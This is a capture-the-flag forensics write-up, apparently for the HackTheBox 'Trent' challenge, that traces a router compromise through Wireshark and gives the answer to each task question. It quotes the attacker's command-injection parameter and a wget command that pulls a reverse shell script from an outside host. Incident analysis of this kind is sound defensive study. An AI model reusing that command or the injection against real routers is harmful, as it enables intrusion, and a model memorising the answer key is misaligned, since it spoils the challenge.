# ![logo](https://github.com/user-attachments/assets/1fbed51a-e14c-4c34-829c-d429bcaa5e04) Trent - DFIR Analysis (HackTheBox)

###   Scenario Overview

The SOC team has identified **suspicious lateral movement** targeting **router firmware** within the network. Network traffic logs reveal **anomalous traffic** and **unauthorized command execution**, indicating that an attacker already present inside the network has compromised a router and is attempting further exploitation.
You are provided with **network traffic logs** from one of the impacted machines. Your objective is to conduct a thorough forensic investigation to uncover the attacker’s **Tactics, Techniques, and Procedures (TTPs)**.

---

###  Investigation Tasks

- Observe the Logs as you can see 192.168.10.2 making connections to the router

####  Task 1  
**Question:** From what IP address did the attacker initially launch their activity?  
**Answer:** `192.168.10.2`

---
- Since we are monitoring the infected router logs look for the incoming traffic IP address.
- Filter for HTTP traffic in Wireshark  and review all Post requests as there are multiple interesting URL traffic.
- Upon review you will find post requests where the attacker is trying to login to the router. If you follow TCP stream of those requests. You will find the router Model Name.
  ![task_2](https://github.com/user-attachments/assets/00236fe7-bac1-4807-9047-f831b6dfe048)

####  Task 2  
**Question:** What is the model name of the compromised router?  
**Answer:** `TEW-827DRU`

---

- If you review all post requests for login with URI  /apply_sec.cgi?csrf_token=
- You will find two failed requests (11:52:53 and 11:52:40) and a successful  login at 2024-05-01 11:53:27 (remember this is EST and UTC is : 2024-05-01 15:53:27)
  ![task_6](https://github.com/user-attachments/assets/c11ddf5a-d2de-4c47-a601-e2225d2e1208)

####  Task 3  
**Question:** How many failed login attempts did the attacker try before successfully logging into the router?  
**Answer:** `2`

####  Task 4  
**Question:** At what UTC time did the attacker successfully log into the router’s web admin interface?  
**Answer:** `2024-05-01 15:53:27 UTC`

---

- Now lets review the Successful Post request. Right click on the packet → Follow → TCP Stream
![task_5](https://github.com/user-attachments/assets/082551a3-4b93-4c4e-a0ee-0d6b8eec0f96)
- You can see no password was entered for successful login

####  Task 5  
**Question:** How many characters long was the password used to log in successfully?  
**Answer:** `0`

####  Task 6  
**Question:** What is the current firmware version installed on the compromised router?  
**Answer:** `2.10`

---

- Now lets review POST requests after 2024-05-01 11:53:27 and you can find multiple POST requests
- Review each one of them by following TCP stream to understand what is happening.
- As you review you will find every Post request trying to inject values to parameter : **“ usbapps.config.smb_admin_name”**
- Like these requests tries to inject **“Whoami”** and some URL with Wget indicating attacker was successful at **command injection**
![task_b](https://github.com/user-attachments/assets/45110500-d631-4be1-b602-7b8659de1dad)
![task_a](https://github.com/user-attachments/assets/6be7e9f7-eb74-4992-acc3-63ae1faa23bf)
- As we can point out that the attacker is using command injection to connect the router to its C2 server.



####  Task 7  
**Question:** Which HTTP parameter was manipulated by the attacker to get remote code execution (RCE) on the system?  
**Answer:** `usbapps.config.smb_admin_name`

---

- Since we Know its a TEW-827DRU router and a remote code execution is performed lets perform some threat intelligence action look for The router with command injection vulnerabilites.
- You will find this https://nvd.nist.gov/vuln/detail/CVE-2024-28353#match-16536444with CVE and router version number.

####  Task 8  
**Question:** What is the CVE number associated with the vulnerability exploited in this attack?  
**Answer:** `CVE-2024-28353`

---

####  Task 9  
**Question:** What was the first command the attacker executed by exploiting the vulnerability?  
**Answer:** `whoami`

- Command observed in the earlier post request.
---

####  Task 10  
**Question:** What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?  
**Answer:** `wget http://35.159.25.253:8000/a1l4m.sh`

---

- When you reviewed post requests earlier you can find POST requests where the reverse shell failed
![task_7-11](https://github.com/user-attachments/assets/76adbb33-3c37-4d4d-84ec-9d6c81cefa2f)
- Error message observed in the POST response following typo injection.

####  Task 11  
**Question:** When the actor made a typo during injection, what response message did the server return?  
**Answer:** `Access to this resource is forbidden`

#### Task 12  
**Question:** What was the IP address and port of the C2 server when the reverse shell successfully connected?  
**Answer:** `35.159.25.253:41143`

---

###  Summary

The attacker leveraged a **remote code execution vulnerability** (CVE-2024-28353) in the **TEW-827DRU router**, exploiting an HTTP parameter via POST requests. Through command injection (`usbapps.config.smb_admin_name`), they executed commands such as `whoami` and used `wget` to pull a reverse shell script, which ultimately connected to a **C2 server** at `35.159.25.253:41143`.

---


